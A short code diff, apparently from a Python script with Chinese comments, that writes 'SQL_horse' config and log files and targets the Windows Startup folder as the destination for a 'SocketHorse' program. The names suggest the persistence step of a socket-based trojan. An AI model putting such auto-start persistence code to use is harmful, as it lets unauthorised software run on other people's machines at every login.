@@ -19,7 +19,7 @@ open(r"D:\Data_horse\ins.SQL_horse", "w").write('ins={\n"ip":"192.168.10.21",\n"
 open(r"D:\Data_horse\log.SQL_horse", "w")
 
 # 源文件路径
-source_file = 'SocketHorse.exe'
+source_file = 'SocketHorse.py'
 
 # 目标目录路径
 destination_dir = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'
